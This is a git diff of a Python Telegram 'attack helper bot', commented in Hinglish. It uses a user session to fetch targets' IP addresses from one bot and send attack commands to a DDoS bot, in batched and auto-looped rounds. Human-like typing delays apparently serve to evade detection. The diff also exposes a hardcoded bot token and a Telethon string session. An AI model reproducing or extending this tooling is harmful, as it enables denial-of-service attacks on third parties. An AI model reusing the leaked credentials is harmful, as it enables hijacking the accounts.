@@ -26,7 +26,9 @@ BOT_TOKEN = "8489391478:AAFn0e-HJplScgnrZ5YH0f2Gc8Q1KO9VeyQ"
 BOT_A = "@botbysahilbot"          # IP BOT
 BOT_B = "@DDOS_Aditya_xd_bot"     # Attack BOT
 
+
 STRING_SESSION = "1BVtsOKEBuwrK8qxvmy15Glw3WMpdO6sLWyYPWJrT_srehGTLqvYQ-h79-TY6GRqf9JfkAHjjzeN2HK-EWRJBlZnep2DpbOSNaqnDGQr3vjlGK9HY42PNWQWopuw-NKZcFYkQkL5aTNmhLw9oIgj0Yv1dCxEVIsK1RlDz8MeV3gw3NOOBO_ugSSiNwQWm9p-LLxDNirZrGBHsPu6ldDZx3ugqYbjqq1lZqBX30-VA_iPxbe-tCfHAJYAuKFsgH17iB-Q5f4HsKYQWGqx2ifgnDXsZhbtlfj7SkU16c4GJzicV9fuKMcJLhjbC2Gt48chDdtShhyBilakU0beFCt4EhgyAxccsPUI="
+
 
 
 tele = TelegramClient(StringSession(STRING_SESSION), API_ID, API_HASH)
@@ -39,7 +41,7 @@ chat_counts: Dict[int, int] = {}             # autoloop count
 
 ip_waiters: Dict[int, asyncio.Future] = {}   # IP BOT reply wait
 auto_tasks: Dict[int, asyncio.Task] = {}     # autoloop task per chat
-BASE_DELAY = 65                             # fixed delay (s) autoloop ke liye
+BASE_DELAY = 65                          # fixed delay (s) autoloop ke liye
 
 
 # ===== HELPERS =====
@@ -88,13 +90,20 @@ async def ip_bot_listener(event):
         ip_waiters.pop(chat_id, None)
 
 
-# ===== CORE: SINGLE ROUND FOR ONE TARGET =====
+@tele.on(events.NewMessage(from_users=BOT_B))
+async def bot_b_listener(event):
+    # optional: status track karna ho to yahan logic daal sakte ho
+    text = event.text or ""
+    print("DDOS BOT MSG:", repr(text))
+
+
+# ===== CORE: SINGLE TARGET ROUND =====
 async def single_round_for_target(
     control_chat_id: int,
     context: ContextTypes.DEFAULT_TYPE,
     target: str,
 ) -> str | None:
-    """Ek target ke liye .getip, CMD return kare ya None (agar fail)."""
+    """Ek target ke liye .getip, CMD return kare ya None."""
     await human_type_and_send(
         context,
         control_chat_id,
@@ -165,14 +174,14 @@ async def batch_round(chat_id: int, context: ContextTypes.DEFAULT_TYPE):
         await human_sleep(1.0, 3.0)
 
 
-# ===== AUTOLOOP WORKER (batch_round ke upar) =====
+# ===== AUTO LOOP (batch_round ke upar) =====
 async def autoloop_worker(chat_id: int, context: ContextTypes.DEFAULT_TYPE):
     count = chat_counts.get(chat_id, 1)
 
     await human_type_and_send(
         context,
         chat_id,
-        f"🔁 Auto loop start. Rounds: {count}, fixed delay: {BASE_DELAY}s.",
+        f"🔁 Auto loop start kar raha hu. Rounds: {count} | Fixed delay: {BASE_DELAY}s.",
     )
 
     try:
@@ -194,17 +203,16 @@ async def autoloop_worker(chat_id: int, context: ContextTypes.DEFAULT_TYPE):
                 f"⏳ Next round se pehle {BASE_DELAY}s wait karunga…",
             )
             await asyncio.sleep(BASE_DELAY)
-
     except asyncio.CancelledError:
         await human_type_and_send(
             context,
             chat_id,
-            "🛑 Auto loop force stop ho gaya.",
+            "🛑 Auto loop force stop ho gaya (stop command se).",
         )
         raise
     finally:
         auto_tasks.pop(chat_id, None)
-        await human_type_and_send(context, chat_id, "✅ Auto loop khatam.")
+        await human_type_and_send(context, chat_id, "✅ Auto loop khatam ho gaya.")
 
 
 # ===== INLINE KEYBOARD HELPERS =====
@@ -229,15 +237,15 @@ def build_keyboard(chat_id: int) -> InlineKeyboardMarkup:
 # ===== COMMAND HANDLERS =====
 async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = """
-👋 Attack helper bot.
+👋 Hey, main attack helper bot hu.
 
 Commands:
-/addchat <link_or_chatid>     - Target list me add
-/listchats                    - Saved list + buttons
+/addchat <link_or_chatid>     - Target list me add karo
+/listchats                    - Saved list + inline buttons
 /setcount <rounds>            - Kitne rounds (batch)
-/startloop                    - Ek batch round
+/startloop                    - Ek batch round (current selection)
 /autoloop                     - Multiple rounds with delay
-/stoploop                     - Auto loop band
+/stoploop                     - Auto loop turant band karo
 """
     await human_type_and_send(context, update.effective_chat.id, text.strip())
 
@@ -318,7 +326,7 @@ async def on_list_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         # ek batch round abhi turant chalao
         asyncio.create_task(batch_round(chat_id, context))
-        return  # keyboard jaisa hai waisa rehne do
+        return  # keyboard as-it-is rahe
 
     # toggle / select_all ke liye keyboard redraw
     reply_markup = build_keyboard(chat_id)
@@ -363,21 +371,12 @@ async def stoploop(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("ℹ️ Is chat me koi auto loop nahi chal raha.")
 
 
-# ===== MAIN =====
-
+# ===== MAIN (jo pehle se kaam kar raha tha) =====
 async def main():
-    # Telethon ko start karo (but run_until_disconnected mat use karo)
     await tele.start()
     print("🧵 Telethon connected")
 
-    app = (
-        Application
-        .builder()
-        .token(BOT_TOKEN)
-        .concurrent_updates(True)   # optional, par helpful
-        .build()
-    )
-
+    app = Application.builder().token(BOT_TOKEN).build()
     app.add_handler(CommandHandler("start", start_cmd))
     app.add_handler(CommandHandler("addchat", addchat))
     app.add_handler(CommandHandler("listchats", listchats))
@@ -388,12 +387,11 @@ async def main():
     app.add_handler(CallbackQueryHandler(on_list_callback))
 
     print("🤖 Control bot running")
+    await app.initialize()
+    await app.start()
+    await app.updater.start_polling()
 
-    # yahi call event loop ko chala ke rakhega
-    await app.run_polling(close_loop=False)
-
-    # agar kabhi bot band karna ho to Telethon disconnect karo
-    await tele.disconnect()
+    await tele.run_until_disconnected()
 
 
 if __name__ == "__main__":
